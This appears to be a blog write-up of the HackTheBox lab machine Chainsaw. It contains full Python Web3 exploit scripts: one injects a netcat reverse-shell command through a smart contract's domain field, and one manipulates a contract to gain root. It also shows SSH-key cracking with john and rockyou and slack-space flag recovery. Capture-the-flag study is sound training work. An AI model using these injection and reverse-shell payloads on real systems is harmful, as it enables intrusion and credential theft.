---
title: "HackTheBox - WriteUp 19"
date: 2019-07-24T21:54:19+08:00
description: "HackTheBox 练手 - Chainsaw - ETH and Disk Block"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Chainsaw

Nmap: 21 Anomymous FTP with vsftpd(ftp:ftp), 22 SSH, 9801 (HTTP)

## User

Anomymously list all the files in the FTP, then get `WeaponizedPing.(sol|json)`, and dynamically changing `address.txt`

Use Web3Py with the existing contract address, issue a transaction with our payload, you'll get a reverse shell as `administrator (UID=1001)`. Same way like box Jarvis.


```python
#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# Licensed under AGPL v3
# Copyright(C) 2019 kmahyyg
#

from web3 import Web3
import logging
import json
import sys
import requests

logger = logging.getLogger('default_log')
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


# Print help
def printusage():
    print("Can only be used in Chainsaw - HTB, as a helper function of getting user.")
    print("Usage: " + sys.argv[0] + " <CONTRACT ADDRESS> <ATTCKER IP> <ATTACKER NC PORT>")


# Get predefined address
try:
    ftp_contraddr = sys.argv[1]
    logger.info("Predefined Contract Address: " + ftp_contraddr)
except IndexError:
    logger.error("Predefined Contract Address not found")
    printusage()
    sys.exit(1)

# Attacker info
try:
    AttackHost = sys.argv[2]
    AttackPort = sys.argv[3]
    AttackPayload = "localhost; nc " + AttackHost + " " + AttackPort + " -e /bin/sh"
except IndexError:
    logger.error("Attack information not found.")
    printusage()
    sys.exit(1)

# SSH Port Forward: localhost:8545:10.10.10.142:9810
ethneturl = "http://localhost:8545"
logger.info("The 10.10.10.142:9810 should be forwarded to {localip}".format(localip=ethneturl))

# predenfined contract address read from the file
predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
logger.info("YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!")
input("Please confirm the above notification, then press enter to continue")

# Detect if port-forward working
r = requests.get(ethneturl, timeout=5)
if r.status_code == 400:
    logger.info("Port Forward seems working, go to next step...")
else:
    logger.error("Private ETH Network forward to {localip} is not successful.".format(localip=ethneturl))
    sys.exit(1)


# Web3Py related code
w3eng = Web3(Web3.HTTPProvider(ethneturl))

network_status = w3eng.isConnected()
logger.info("Check if connected: " + str(network_status))
if not network_status:
    print("System network does not connect.")
    sys.exit(1)

# --- Learning and Testing Code ---
# --- Should be commented when finally use ---

# Dump the private chain accounts
logger.info("Trying to dump the accounts...")
all_acc = w3eng.eth.accounts
# logger.info("Trying to get balance of each account...")
# for accidx in range(0, len(all_acc)):
#     print("{par1}: {par2}".format(par1=str(all_acc[accidx]), par2=w3eng.eth.getBalance(all_acc[accidx])))

# --- Learning and Testing Code End ---

# According to Solidity compiler document, for new contract, must: account == 0
# construct new contract OR Using the existing contract

# set pre-funded account as sender
w3eng.eth.defaultAccount = all_acc[0]  # if new contract, account = 0
# Read contract ABI from json
cont_json = open('assets/WeaponizedPing.json', 'r').read()
cont_json = json.loads(cont_json)
cur_abi = cont_json['abi']
cur_cont_addr = predefined_cont_addr

cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
cur_cont_funcs = cur_cont.functions
logger.info("Get Contract Functions: " + str(cur_cont_funcs))

# RCE
exploit = cur_cont_funcs.setDomain(AttackPayload).transact()
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit)
print("Receipt Found: ", sep='')
print(w3eng.eth.getTransactionReceipt(exploit))
finalres = cur_cont.functions.getDomain().call()
logger.info("Payload returned back is: " + finalres)
logger.info("DONE! You should get reverse shell now.")
```

After shell, check `/home/administrator/maintain`, you know that he is gonna distribute the private key via email. And you also found `.ipfs` in his home, so 

```bash
administrator@chainsaw:/home/administrator/.ipfs$ grep -rwni "bobby"
```

You will find a data file inside the ipfs and get the base64 encoded ssh private key encrypted with passphrase.

On your local: 

```sh
# ln -s /usr/share/john/ssh2john.py /usr/local/bin/ssh2john
$ ssh2john ./privkey_bobby > bobby_sshhash
$ john ./bobby_sshhash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
PASSWORD IS: jackychain
```

Then you get the user.

## Root

You'll find a SUID file: `/home/bobby/projects/ChainsawClub/ChainsawClub`

Then Web3Py again:

```python
#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# Licensed under AGPL v3
# Copyright(C) 2019 kmahyyg
#

import json
import logging
import sys

import requests
from web3 import Web3

logger = logging.getLogger('default_log')
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


# Print help
def printusage():
    print("Can only be used in Chainsaw - HTB, as a helper function of getting root.")
    print("Usage: " + sys.argv[0] + " <CONTRACT ADDRESS>")


# Get predefined address
try:
    ftp_contraddr = sys.argv[1]
    logger.info("Predefined Contract Address: " + ftp_contraddr)
except IndexError:
    logger.error("Predefined Contract Address not found")
    printusage()
    sys.exit(1)

# SSH Port Forward
ethneturl = "http://localhost:8545"
logger.critical("ssh -L 8545:127.0.0.1:63991 -N -T -i storage/chainsaw/bobby.key.enc bobby@10.10.10.142 -v")
logger.info("The 127.0.0.1:63991 should be SSH-forwarded to {localip} as bobby@10.10.10.142".format(localip=ethneturl))

# predenfined contract address read from the file
predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
logger.info("YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!")
input("Please confirm the above notification, then press enter to continue")

# Detect if port-forward working
r = requests.get(ethneturl, timeout=5)
if r.status_code == 400:
    logger.info("Port Forward seems working, go to next step...")
else:
    logger.error("Private ETH Network forward to {localip} is not successful.".format(localip=ethneturl))
    sys.exit(1)

# Web3Py related code
w3eng = Web3(Web3.HTTPProvider(ethneturl))

network_status = w3eng.isConnected()
logger.info("Check if connected: " + str(network_status))
if not network_status:
    print("System network does not connect.")
    sys.exit(1)

logger.info("Trying to dump the accounts...")
all_acc = w3eng.eth.accounts
w3eng.eth.defaultAccount = all_acc[0]
cont_json = open('assets/ChainsawClub.json', 'r').read()
cont_json = json.loads(cont_json)
cur_abi = cont_json['abi']
cur_cont_addr = predefined_cont_addr
cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
cur_cont_funcs = cur_cont.functions
logger.info("Get Contract Functions: " + str(cur_cont_funcs))

# SET PASSWORD AND NEW USER

exploit1 = cur_cont_funcs.setUsername('fuc123root').transact()
logger.critical("REMEMBER: Username: fuc123root , Password:7b45r5ca1")
logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit1))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit1)
w3eng.eth.getTransactionReceipt(exploit1)

exploit2 = cur_cont_funcs.setPassword('fe9ed8836679fd78f8cd8956b77e254b').transact()  # md5-hashed: 7b45r5ca1
logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit2))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit2)
w3eng.eth.getTransactionReceipt(exploit2)

exploit3 = cur_cont_funcs.setApprove(True).transact()
logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit3))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit3)
w3eng.eth.getTransactionReceipt(exploit3)

exploitXI = cur_cont_funcs.getBalance().call()
logger.critical("Current Account Balance: " + str(exploitXI))
logger.info("All supply will be transfered.")

exploitXII = cur_cont_funcs.getSupply().call()
logger.critical("Current supply: " + str(exploitXII))

exploit4 = cur_cont_funcs.transfer(int(exploitXII)).transact()
logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit4))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit4)
w3eng.eth.getTransactionReceipt(exploit4)

# Get result

print("Current Account Info: ")
exploit5 = cur_cont_funcs.getUsername().call()
print("Username: " + exploit5)

exploit6 = cur_cont_funcs.getPassword().call()
print("MD5 hashed password: " + exploit6)

exploit7 = cur_cont_funcs.getApprove().call()
print("Approved: " + str(exploit7))

exploit8 = cur_cont_funcs.getSupply().call()
print("Now Supply: " + str(exploit8) + "/1000")

exploit9 = cur_cont_funcs.getBalance().call()
print("Your account balance: " + str(exploit9))

logger.info("DONE!")
```

Two things to notice: 

- To build transaction, you must submit password with md5-hashed, but login with plain text.
- To get logged in, set `approve` to True, and transfer all supply you can.

Then you will get a root shell. But not root flag...

Use `dpkg -S /sbin/*`, you'll find a tool called `bmap` which is not installed with the package management system of Debian.

Then run `bmap --mode slack /root/root.txt` to display data in slack space, then you have the root flag.

# Referrence

- http://www.dappuniversity.com/articles/web3-py-intro
- https://solidity-cn.readthedocs.io/


(END)
